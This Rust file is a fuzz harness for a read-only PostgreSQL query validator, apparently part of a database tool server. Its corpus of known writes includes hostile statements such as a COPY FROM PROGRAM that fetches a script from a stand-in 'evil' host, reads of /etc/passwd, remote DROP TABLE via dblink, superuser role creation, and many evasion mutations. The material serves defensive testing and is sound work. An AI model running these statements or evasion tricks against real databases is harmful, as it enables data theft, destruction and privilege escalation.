//! Validator fuzz harness — DETERMINISTIC, no LLM involved.
//!
//! It complements the two other assurance legs: a corpus generator that invents new attack vectors,
//! and a parser-differential harness that asks PostgreSQL itself whether a statement is truly read-only.
//! This one takes a CORPUS of known writes and **mutates it with transformations that do not change
//! SQL semantics** (comments, whitespace, letter case, dollar-quoting, invisible Unicode, parentheses)
//! — precisely the tricks that defeated an earlier text-based scan three times over.
//!
//! Invariants (a violation is a FINDING):
//!   I1  a mutated write NEVER gets ALLOW (no mutation turns it into a legitimate read),
//!   I2  the validator NEVER panics on any input (a panic in the validator is a server DoS),
//!   I3  canonicalisation round-trip: ALLOW ⇒ `enforce_limit` yields text that is itself ALLOW
//!       (that text is what actually reaches the database — if canonicalisation changed meaning,
//!        we would be validating one statement and executing another),
//!   I4  cost routing: ALLOW + a Query statement ⇒ the canonical text is a `is_row_query`
//!       (otherwise the query slips past the cost guard and the byte cap),
//!   I5  appending a second statement NEVER yields ALLOW (multi-statement),
//!   I6  time budget: a single validation stays under SLOW_MS (defence against exponential parsing).

use crate::validate;

const SLOW_MS: u128 = 250;

pub struct Finding {
    pub kind: &'static str,
    pub input: String,
    pub detail: String,
}

pub struct Report {
    pub iters: u64,
    pub seed: u64,
    pub findings: Vec<Finding>,
    pub slowest_ms: u128,
    pub slowest_input: String,
}

// --- deterministic PRNG (xorshift64*) — no dependency, same seed = same run ---
struct Rng(u64);
impl Rng {
    fn new(seed: u64) -> Self {
        Rng(seed | 1)
    }
    fn next_u64(&mut self) -> u64 {
        let mut x = self.0;
        x ^= x >> 12;
        x ^= x << 25;
        x ^= x >> 27;
        self.0 = x;
        x.wrapping_mul(0x2545_F491_4F6C_DD1D)
    }
    fn below(&mut self, n: usize) -> usize {
        if n == 0 {
            0
        } else {
            (self.next_u64() % n as u64) as usize
        }
    }
    fn pick<'a, T>(&mut self, xs: &'a [T]) -> &'a T {
        &xs[self.below(xs.len())]
    }
}

/// Corpus of WRITES/side effects — each MUST be rejected under every semantically equivalent mutation.
/// Collected from unit tests, adversarial review rounds, the vector generator and the parser differential.
const WRITE_SEEDS: &[&str] = &[
    "EXPLAIN (ANALYSE) DELETE FROM t",
    "SELECT * FROM ts_stat('SELECT pg_read_file(''/etc/passwd'')::tsvector')",
    "SELECT * FROM LATERAL pg_read_file('/etc/passwd') x",
    "SELECT * FROM t JOIN LATERAL dblink_exec('c', 'DROP TABLE t') d ON true",
    "INSERT INTO users VALUES (1)",
    "UPDATE users SET name = 'bob' WHERE id = 1",
    "DELETE FROM users WHERE id = 1",
    "DROP TABLE users",
    "TRUNCATE users",
    "ALTER TABLE users ADD COLUMN age INT",
    "CREATE TABLE t (id int)",
    "CREATE TEMP TABLE t AS SELECT 1",
    "CREATE MATERIALIZED VIEW mv AS SELECT 1",
    "REFRESH MATERIALIZED VIEW mv",
    "GRANT ALL ON users TO public",
    "COPY users FROM PROGRAM 'curl http://evil/x.sh'",
    "COPY (SELECT 1) TO '/tmp/x'",
    "DO $$ BEGIN PERFORM 1; END $$",
    "CALL some_proc()",
    "VACUUM users",
    "ANALYZE users",
    "REINDEX TABLE users",
    "SET ROLE postgres",
    "SET default_transaction_read_only = off",
    "RESET ALL",
    "DISCARD ALL",
    "BEGIN",
    "COMMIT",
    "LOCK TABLE users",
    "DECLARE c CURSOR FOR SELECT 1",
    "FETCH ALL FROM c",
    "MERGE INTO users u USING staging s ON u.id = s.id WHEN MATCHED THEN DELETE",
    "PREPARE p AS INSERT INTO users VALUES (1)",
    "EXECUTE p",
    "CREATE FUNCTION f() RETURNS int AS 'SELECT 1' LANGUAGE sql",
    "LISTEN ch",
    "NOTIFY ch, 'x'",
    "CREATE ROLE hacker LOGIN SUPERUSER",
    // structural bypasses (a Query on top, a write inside)
    "WITH x AS (INSERT INTO users VALUES (1) RETURNING *) SELECT * FROM x",
    "WITH x AS (UPDATE users SET n = 1 RETURNING *) SELECT * FROM x",
    "WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x",
    "SELECT * FROM (INSERT INTO t VALUES (1) RETURNING *) AS i",
    "SELECT 1 INTO diff_probe_a",
    "SELECT table_name FROM information_schema.tables INTO probe_b",
    "SELECT * FROM users FOR UPDATE",
    "SELECT * FROM users FOR SHARE",
    "EXPLAIN ANALYZE SELECT 1",
    "EXPLAIN (ANALYZE) SELECT * FROM users",
    "EXPLAIN ANALYZE INSERT INTO users VALUES (1)",
    // side-effect functions (denylist, scanned on the AST)
    "SELECT setval('users_id_seq', 1)",
    "SELECT nextval('users_id_seq')",
    "SELECT pg_sleep(10)",
    "SELECT pg_notify('ch', 'x')",
    "SELECT set_config('search_path', 'evil', false)",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT pg_file_write('/tmp/x', 'y', false)",
    "SELECT lo_export(1, '/tmp/x')",
    "SELECT dblink_exec('dbname=x', 'DROP TABLE t')",
    "SELECT pg_terminate_backend(1)",
    "SELECT pg_advisory_lock(1)",
    "SELECT pg_stat_reset()",
    "SELECT pg_logical_emit_message(true, 'p', 'x')",
    "SELECT pg_create_logical_replication_slot('s', 'test_decoding')",
    // functions that a PostgreSQL read-only transaction does NOT block
    "SELECT pg_import_system_collations('public'::regnamespace)",
    "SELECT gin_clean_pending_list('idx'::regclass)",
    "SELECT pg_backup_start('label')",
    "SELECT lowrite(1, 'x')",
    "SELECT pg_promote()",
    "SELECT pg_ls_waldir()",
    // nested / hidden in a subquery, CTE, CASE or aggregate
    "SELECT (SELECT setval('s', 1))",
    "WITH x AS (SELECT pg_sleep(5)) SELECT * FROM x",
    "SELECT CASE WHEN true THEN pg_notify('c', 'x') END",
    "SELECT count(*) FROM (SELECT setval('s', 1)) q",
    "SELECT * FROM pg_read_file('/etc/passwd')",
    "SELECT 1 UNION SELECT setval('s', 1)",
    "SELECT array_agg(x) FROM (SELECT pg_sleep(1) AS x) t",
    // current_setting of a variable SHOW refuses, in the literal spellings a mutation keeps equal
    // (R11, 0.1.12 review). `U&'x'` is pinned in MUST_REJECT instead: a comment inserted between
    // `U` and `&` makes it a different expression, which is not a bypass.
    "SELECT current_setting(E'data_directory')",
    "SELECT current_setting($$hba_file$$)",
    "SELECT current_setting(('data_directory'::text))",
    "SELECT current_setting('data_' || 'directory')",
    // a sort operator outside pg_catalog (R15, 0.1.12 review)
    "SELECT id FROM users ORDER BY id USING OPERATOR(public.<<<)",
    "SELECT array_agg(id ORDER BY id USING OPERATOR(ext.<<<)) FROM users",
];

/// Corpus of legitimate READS — exercises I3/I4 (canonicalisation, cost routing) and panic freedom.
const READ_SEEDS: &[&str] = &[
    "SELECT 1",
    "SELECT * FROM users",
    "SELECT * FROM users LIMIT 5",
    "SELECT count(*) FROM users",
    "SELECT EXISTS (SELECT 1 FROM users)",
    "WITH x AS (SELECT 1 AS a) SELECT * FROM x",
    "WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t WHERE n < 10) SELECT * FROM t",
    "VALUES (1, 'a'), (2, 'b')",
    "TABLE users",
    "SELECT a.id, b.name FROM a JOIN b ON a.id = b.id WHERE b.name ILIKE '%x%'",
    "SELECT jsonb_build_object('k', v) FROM t",
    "SELECT * FROM generate_series(1, 10)",
    "SELECT * FROM unnest(ARRAY[1,2,3])",
    "SELECT sum(amount) FROM payment GROUP BY customer_id ORDER BY 1 DESC",
    "SELECT 'setval(x)' AS literal_not_a_call",
    "SELECT $$pg_sleep(9)$$ AS dollar_literal",
    "SELECT E'pg_read_file' AS escaped_literal",
    "(SELECT 1)",
    "((SELECT 1))",
    "EXPLAIN SELECT 1",
    "SHOW timezone",
    "SELECT * FROM t WHERE x = ANY (SELECT y FROM u)",
];

// --- literal awareness: mutate ONLY outside strings, comments and quoted identifiers ---
/// Byte offsets (on char boundaries) where an insertion cannot land inside a literal or comment.
fn safe_positions(sql: &str) -> Vec<usize> {
    #[derive(PartialEq)]
    enum S {
        Normal,
        Single,
        Double,
        Dollar,
        Line,
        Block,
    }
    let b = sql.as_bytes();
    let mut st = S::Normal;
    let mut depth = 0usize; // nested /* */
    let mut dollar_tag = String::new();
    let mut out = Vec::new();
    let mut i = 0usize;
    while i < b.len() {
        match st {
            S::Normal => {
                if b[i] == b'\'' {
                    st = S::Single;
                } else if b[i] == b'"' {
                    st = S::Double;
                } else if b[i] == b'-' && i + 1 < b.len() && b[i + 1] == b'-' {
                    st = S::Line;
                } else if b[i] == b'/' && i + 1 < b.len() && b[i + 1] == b'*' {
                    st = S::Block;
                    depth = 1;
                    i += 2;
                    continue;
                } else if b[i] == b'$' {
                    // $tag$ ... $tag$
                    if let Some(end) = sql[i + 1..].find('$') {
                        let tag = &sql[i + 1..i + 1 + end];
                        if tag.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
                            dollar_tag = format!("${}$", tag);
                            st = S::Dollar;
                            i += dollar_tag.len();
                            continue;
                        }
                    }
                }
                if st == S::Normal && sql.is_char_boundary(i) {
                    out.push(i);
                }
            }
            S::Single => {
                if b[i] == b'\'' {
                    st = S::Normal;
                }
            }
            S::Double => {
                if b[i] == b'"' {
                    st = S::Normal;
                }
            }
            S::Line => {
                if b[i] == b'\n' {
                    st = S::Normal;
                }
            }
            S::Block => {
                if b[i] == b'/' && i + 1 < b.len() && b[i + 1] == b'*' {
                    depth += 1;
                    i += 2;
                    continue;
                }
                if b[i] == b'*' && i + 1 < b.len() && b[i + 1] == b'/' {
                    depth -= 1;
                    i += 2;
                    if depth == 0 {
                        st = S::Normal;
                    }
                    continue;
                }
            }
            S::Dollar => {
                // the scan is byte-wise and a literal may contain multi-byte Unicode —
                // slice only on a char boundary (otherwise the harness itself panics).
                if sql.is_char_boundary(i) && sql[i..].starts_with(&dollar_tag) {
                    i += dollar_tag.len();
                    st = S::Normal;
                    continue;
                }
            }
        }
        i += 1;
    }
    if st == S::Normal {
        out.push(sql.len());
    }
    out
}

const WS: &[&str] = &[" ", "\t", "\n", "\r\n", "\x0c", "\x0b", "  \t "];
/// Invisible/directional Unicode — the ASCII-smuggling vector (OWASP MCP03/MCP06).
const INVISIBLE: &[&str] = &[
    "\u{200b}",
    "\u{200c}",
    "\u{200d}",
    "\u{feff}",
    "\u{2060}",
    "\u{202e}",
    "\u{202d}",
    "\u{00a0}",
    "\u{e0001}",
    "\u{e0073}",
];

fn junk(rng: &mut Rng, n: usize) -> String {
    const A: &[u8] = b"abcXYZ_019 \t;,.()[]{}*/-+='\"$@#%^&|~`?:!<>\\";
    (0..n).map(|_| *rng.pick(A) as char).collect()
}

/// Filler for the INSIDE of a comment — without `/` and `*`, because next to the delimiter they form
/// another `/*` (PostgreSQL nests comments) and the comment swallows the rest of the query. The mutant
/// then stops being the write we are guarding, and the fuzzer reports a false positive — confirmed
fn comment_junk(rng: &mut Rng, n: usize) -> String {
    const A: &[u8] = b"abcXYZ_019 \t;,.()[]{}-+='\"$@#%^&|~`?:!<>";
    (0..n).map(|_| *rng.pick(A) as char).collect()
}

/// May a whitespace/comment be inserted here without SPLITTING a token? A comment inside an
/// identifier (`pg_re/*x*/ad_file`) is NOT equivalent in PostgreSQL — it breaks into two tokens,
/// so the mutation would change semantics and produce false findings.
fn is_token_boundary(sql: &str, at: usize) -> bool {
    let ident = |c: char| c.is_alphanumeric() || c == '_' || c == '$';
    // Between two operator characters is inside an operator: `|/**/|` is not `||` but two `|`, a
    // different statement, which the checks then rightly did not treat as the seed.
    let op = |c: char| "+-*/<>=~!@#%^&|`?".contains(c);
    match (sql[..at].chars().next_back(), sql[at..].chars().next()) {
        (Some(p), Some(n)) => !(ident(p) && ident(n)) && !(op(p) && op(n)),
        _ => true,
    }
}

/// One mutation preserving SQL semantics (or breaking parsing — the invariant is one-directional).
fn mutate_once(rng: &mut Rng, sql: &str) -> String {
    let pos = safe_positions(sql);
    if pos.is_empty() {
        return sql.to_string();
    }
    // Insertions only at token boundaries; case flips and literal rewrites may happen anywhere.
    let boundaries: Vec<usize> = pos
        .iter()
        .copied()
        .filter(|&i| is_token_boundary(sql, i))
        .collect();
    if boundaries.is_empty() {
        return flip_case_outside_literals(rng, sql);
    }
    let at = *rng.pick(&boundaries);
    match rng.below(9) {
        0 => insert(sql, at, rng.pick(WS)),
        1 => {
            let n = 1 + rng.below(12);
            insert(sql, at, &format!("/*{}*/", comment_junk(rng, n)))
        }
        2 => {
            // nested block comment (PostgreSQL nests them — a common blind spot for scanners)
            let n = 1 + rng.below(6);
            insert(sql, at, &format!("/*a/*{}*/b*/", comment_junk(rng, n)))
        }
        3 => {
            let n = 1 + rng.below(12);
            insert(
                sql,
                at,
                &format!("--{}\n", comment_junk(rng, n).replace('\n', " ")),
            )
        }
        4 => insert(sql, at, rng.pick(INVISIBLE)),
        5 => flip_case_outside_literals(rng, sql),
        6 => requote_literal(rng, sql),
        7 => wrap_table_function(rng, sql).unwrap_or_else(|| sql.to_string()),
        _ => format!("({})", sql),
    }
}

/// Structural mutation: rewrites a table function in `FROM` into the other shapes PostgreSQL parses it
/// as. `FROM f(..)` and `FROM LATERAL f(..)` are different AST nodes, and the 0.1.11 audit found the
/// second one unread by every rule written for the first (`SELECT * FROM LATERAL pg_read_file(..)`
/// returned the file). Text mutations (whitespace, comments, case) never change the node, so a fuzzer
/// limited to them cannot rediscover that class; this one can.
fn wrap_table_function(rng: &mut Rng, sql: &str) -> Option<String> {
    let lower = sql.to_ascii_lowercase();
    // every `from ` that is followed by `ident(`
    let mut hits = Vec::new();
    let mut from = 0;
    while let Some(i) = lower[from..].find("from ") {
        let start = from + i + 5;
        let rest = &lower[start..];
        let ident_len = rest
            .chars()
            .take_while(|c| c.is_ascii_alphanumeric() || *c == '_' || *c == '.')
            .count();
        if ident_len > 0 && rest[ident_len..].starts_with('(') {
            hits.push((start, start + ident_len));
        }
        from = start;
    }
    if hits.is_empty() {
        return None;
    }
    let (start, open) = *rng.pick(&hits);
    // matching close paren, skipping single-quoted literals
    let (mut depth, mut quoted, mut close) = (0i32, false, None);
    for (off, c) in sql[open..].char_indices() {
        match c {
            '\'' => quoted = !quoted,
            '(' if !quoted => depth += 1,
            ')' if !quoted => {
                depth -= 1;
                if depth == 0 {
                    close = Some(open + off + 1);
                    break;
                }
            }
            _ => {}
        }
    }
    let close = close?;
    let (head, call, tail) = (&sql[..start], &sql[start..close], &sql[close..]);
    Some(match rng.below(4) {
        0 => format!("{head}LATERAL {call}{tail}"),
        1 => format!("{head}(SELECT 1 AS o) q CROSS JOIN LATERAL {call} x{tail}"),
        2 => format!("{head}{call} WITH ORDINALITY AS x(a, b){tail}"),
        _ => format!("{head}(SELECT 1 AS o) q JOIN LATERAL {call} x ON true{tail}"),
    })
}

fn insert(sql: &str, at: usize, what: &str) -> String {
    let mut s = String::with_capacity(sql.len() + what.len());
    s.push_str(&sql[..at]);
    s.push_str(what);
    s.push_str(&sql[at..]);
    s
}

/// Flip a letter OUTSIDE literals — keywords and unquoted identifiers are case-insensitive in
/// PostgreSQL, so the semantics are unchanged.
fn flip_case_outside_literals(rng: &mut Rng, sql: &str) -> String {
    let cand: Vec<usize> = safe_positions(sql)
        .into_iter()
        .filter(|&i| {
            sql[i..]
                .chars()
                .next()
                .is_some_and(|c| c.is_ascii_alphabetic())
        })
        .collect();
    if cand.is_empty() {
        return sql.to_string();
    }
    let at = *rng.pick(&cand);
    let c = sql[at..].chars().next().unwrap();
    let flipped = if c.is_ascii_uppercase() {
        c.to_ascii_lowercase()
    } else {
        c.to_ascii_uppercase()
    };
    format!("{}{}{}", &sql[..at], flipped, &sql[at + 1..])
}

/// Rewrite the literal `'x'` into an equivalent `$$x$$` / `E'x'` — exactly the class that defeated
/// an earlier text-based scan (quoting → dollar-quote → E-string).
fn requote_literal(rng: &mut Rng, sql: &str) -> String {
    let b = sql.as_bytes();
    let mut i = 0usize;
    let mut lits: Vec<(usize, usize)> = Vec::new(); // (start, end) including the quotes
    while i < b.len() {
        if b[i] == b'\'' {
            if let Some(off) = sql[i + 1..].find('\'') {
                let end = i + 1 + off;
                lits.push((i, end + 1));
                i = end + 1;
                continue;
            }
            break;
        }
        i += 1;
    }
    let usable: Vec<&(usize, usize)> = lits
        .iter()
        .filter(|(s, e)| {
            let inner = &sql[s + 1..e - 1];
            // A prefixed literal (`E'x'`, `U&'x'`, `N'x'`) is not `'x'`: replacing only the quoted
            // part turned `E'x'` into the identifier `E$$x$$`, a different statement, which the
            // checks then rightly did not treat as the seed.
            let prefixed = *s > 0 && {
                let p = b[s - 1];
                p.is_ascii_alphanumeric() || p == b'_' || p == b'&'
            };
            !prefixed && !inner.contains('$') && !inner.contains('\\') && !inner.is_empty()
        })
        .collect();
    if usable.is_empty() {
        return sql.to_string();
    }
    let (s, e) = *usable[rng.below(usable.len())];
    let inner = &sql[s + 1..e - 1];
    let rewritten = match rng.below(3) {
        0 => format!("$${}$$", inner),
        1 => format!("E'{}'", inner),
        _ => format!("$tag${}$tag$", inner),
    };
    format!("{}{}{}", &sql[..s], rewritten, &sql[e..])
}

/// Purely random/pathological input — checks only for panics and the time budget.
fn garbage(rng: &mut Rng) -> String {
    match rng.below(6) {
        0 => {
            let n = 1 + rng.below(200);
            junk(rng, n)
        }
        1 => format!("SELECT {}", "(".repeat(1 + rng.below(300))),
        2 => format!(
            "{}SELECT 1{}",
            "(".repeat(1 + rng.below(200)),
            ")".repeat(1 + rng.below(200))
        ),
        3 => format!("SELECT {}", "1+".repeat(1 + rng.below(2000))),
        4 => format!(
            "WITH {} SELECT 1",
            "x AS (SELECT 1), ".repeat(1 + rng.below(200))
        ),
        _ => {
            let s: String = (0..1 + rng.below(50))
                .map(|_| *rng.pick(INVISIBLE))
                .collect();
            format!("SELECT{}1", s)
        }
    }
}

// --- run ---

fn check(
    input: &str,
    findings: &mut Vec<Finding>,
    slowest: &mut (u128, String),
    must_reject: bool,
) {
    let t0 = std::time::Instant::now();
    let verdict = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        validate::validate_readonly(input)
    }));
    let ms = t0.elapsed().as_millis();
    if ms > slowest.0 {
        *slowest = (ms, input.to_string());
    }
    if ms > SLOW_MS {
        findings.push(Finding {
            kind: "SLOW",
            input: input.to_string(),
            detail: format!("{} ms", ms),
        });
    }
    let verdict = match verdict {
        Ok(v) => v,
        Err(_) => {
            findings.push(Finding {
                kind: "PANIC",
                input: input.to_string(),
                detail: "validate_readonly panicked".into(),
            });
            return;
        }
    };
    if verdict.is_err() {
        return; // rejected — the remaining invariants only concern ALLOW
    }
    if must_reject {
        findings.push(Finding {
            kind: "ALLOWED_WRITE",
            input: input.to_string(),
            detail: "a mutated write passed the validator (I1)".into(),
        });
        return;
    }
    // I3 + I4: the canonical text that actually reaches the database must defend itself.
    let canon = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        validate::enforce_limit(input, 1000)
    }));
    let canon = match canon {
        Ok(Ok(c)) => c,
        Ok(Err(_)) => return,
        Err(_) => {
            findings.push(Finding {
                kind: "PANIC",
                input: input.to_string(),
                detail: "enforce_limit panicked".into(),
            });
            return;
        }
    };
    // I2 says the validator never panics, and this harness is what finds out. A panic in the checks
    // BELOW would abort the run instead of being reported — the finder dying on the thing it exists
    // to find. Every call that touches attacker-shaped text is therefore caught, not just the first.
    let post = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        (
            validate::validate_readonly(&canon).is_err(),
            validate::is_query_stmt(input) && !crate::is_row_query(&canon),
        )
    }));
    let (canon_unsafe, cost_bypass) = match post {
        Ok(v) => v,
        Err(_) => {
            findings.push(Finding {
                kind: "PANIC",
                input: input.to_string(),
                detail: "a check on the canonical text panicked".into(),
            });
            return;
        }
    };
    if canon_unsafe {
        findings.push(Finding {
            kind: "CANON_UNSAFE",
            input: input.to_string(),
            detail: format!(
                "canonical form is rejected by the validator (I3): {}",
                trunc(&canon)
            ),
        });
    }
    if cost_bypass {
        findings.push(Finding {
            kind: "COST_BYPASS",
            input: input.to_string(),
            detail: format!(
                "a Query whose canonical text is not a row-query, so it skips the cost guard (I4): {}",
                trunc(&canon)
            ),
        });
    }
}

fn trunc(s: &str) -> String {
    if s.chars().count() <= 120 {
        s.to_string()
    } else {
        s.chars().take(120).collect::<String>() + "…"
    }
}

pub fn run(iters: u64, seed: u64) -> Report {
    let prev_hook = std::panic::take_hook();
    // Quiet — validator panics are reported by us. MCP_FUZZ_VERBOSE=1 restores the hook (harness debug).
    if std::env::var("MCP_FUZZ_VERBOSE").is_err() {
        std::panic::set_hook(Box::new(|_| {}));
    }
    let mut rng = Rng::new(seed);
    let mut findings = Vec::new();
    let mut slowest = (0u128, String::new());

    for i in 0..iters {
        match i % 10 {
            // 0-5: mutated writes (I1) — the core of the fuzzer
            0..=5 => {
                let base = rng.pick(WRITE_SEEDS).to_string();
                let mut m = base;
                for _ in 0..1 + rng.below(4) {
                    m = mutate_once(&mut rng, &m);
                }
                check(&m, &mut findings, &mut slowest, true);
            }
            // 6-7: mutated reads (I2/I3/I4)
            6 | 7 => {
                let base = rng.pick(READ_SEEDS).to_string();
                let mut m = base;
                for _ in 0..1 + rng.below(3) {
                    m = mutate_once(&mut rng, &m);
                }
                check(&m, &mut findings, &mut slowest, false);
            }
            // 8: appending a second statement (I5)
            8 => {
                let read = rng.pick(READ_SEEDS);
                let write = rng.pick(WRITE_SEEDS);
                let sep = rng.pick(&[";", "; ", ";\n", ";--x\n", ";/*c*/"]);
                let m = format!("{}{}{}", read, sep, write);
                check(&m, &mut findings, &mut slowest, true);
            }
            // 9: garbage/pathological input (I2/I6)
            _ => {
                let g = garbage(&mut rng);
                check(&g, &mut findings, &mut slowest, false);
            }
        }
    }
    std::panic::set_hook(prev_hook);
    Report {
        iters,
        seed,
        findings,
        slowest_ms: slowest.0,
        slowest_input: trunc(&slowest.1),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Short CI run — 2000 iterations, fixed seed. Zero findings is required.
    #[test]
    fn fuzz_smoke() {
        let r = run(2_000, 0x5EED_1234);
        assert!(
            r.findings.is_empty(),
            "the fuzzer found {} problems, first: {} / {}",
            r.findings.len(),
            r.findings[0].kind,
            r.findings[0].input
        );
    }

    /// The literal scanner must never point at a position inside a string or comment.
    #[test]
    fn a_table_function_is_rewritten_into_the_lateral_and_ordinality_shapes() {
        let mut rng = Rng::new(7);
        let sql = "SELECT * FROM pg_read_file('/etc/passwd') x";
        let seen: std::collections::HashSet<String> = (0..200)
            .filter_map(|_| wrap_table_function(&mut rng, sql))
            .collect();
        assert!(
            seen.iter().any(|s| s.contains("FROM LATERAL pg_read_file")),
            "{seen:?}"
        );
        assert!(
            seen.iter().any(|s| s.contains("CROSS JOIN LATERAL")),
            "{seen:?}"
        );
        assert!(
            seen.iter().any(|s| s.contains("WITH ORDINALITY")),
            "{seen:?}"
        );
        assert!(wrap_table_function(&mut rng, "SELECT 1").is_none());
        // and the validator still refuses every variant
        for m in &seen {
            assert!(crate::validate::validate_readonly(m).is_err(), "{m}");
        }
    }

    #[test]
    fn safe_positions_skips_literals() {
        let sql = "SELECT 'a b', $$c d$$, \"e f\" /* g */ -- h\n FROM t";
        for p in safe_positions(sql) {
            let head = &sql[..p];
            let q = head.matches('\'').count();
            assert!(
                q.is_multiple_of(2),
                "position {} inside a literal: {}",
                p,
                head
            );
        }
    }

    /// Mutators must never flip the verdict to ALLOW for a known write.
    #[test]
    fn mutations_keep_writes_rejected() {
        let mut rng = Rng::new(7);
        for seed_sql in WRITE_SEEDS.iter().take(20) {
            for _ in 0..50 {
                let m = mutate_once(&mut rng, seed_sql);
                assert!(
                    validate::validate_readonly(&m).is_err(),
                    "mutant passed: {m}"
                );
            }
        }
    }
}
